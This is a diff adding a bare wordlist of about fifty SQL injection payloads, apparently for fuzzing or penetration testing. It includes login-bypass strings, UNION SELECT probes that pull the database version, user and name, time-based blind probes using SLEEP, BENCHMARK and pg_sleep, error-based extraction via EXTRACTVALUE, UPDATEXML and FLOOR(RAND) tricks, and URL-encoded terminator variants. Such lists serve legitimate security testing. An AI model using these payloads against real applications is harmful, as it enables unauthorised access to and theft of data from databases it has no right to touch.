@@ -1,0 +1,57 @@
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+" OR "1"="1
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+" OR 1=1/*
+') OR ('1'='1
+") OR ("1"="1
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT ALL NULL--
+' UNION SELECT ALL NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 'a','b','c'--
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(5)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND BENCHMARK(1000000,MD5(1))--
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
+' AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name LIKE 'users%')--
+' OR 'a'='a
+' OR 'a'='b
+' OR 1=1 LIMIT 1
+' OR 1=1 LIMIT 1 OFFSET 1
+' GROUP BY 1--
+' ORDER BY 1--
+' ORDER BY 100--
+' HAVING 1=1--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,0x7e,(SELECT version()),0x7e,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,0x7e,(SELECT user()),0x7e,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,0x7e,(SELECT database()),0x7e,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+" UNION SELECT @@version,NULL,NULL--
+" UNION SELECT user(),NULL,NULL--
+" UNION SELECT database(),NULL,NULL--
+" AND SLEEP(5)--
+' OR pg_sleep(5)--
+' OR 1=1-
+' OR 1=1;
+' OR 1=1\
+' OR 1=1%00
+' OR 1=1%0a
+' OR 1=1%0d
+' OR 1=1%09
+' OR 1=1%20
+' OR 1=1%23
+' OR 1=1%2d%2d
+' OR 1=1%2f%2a
+' OR 1=1%2a%2f
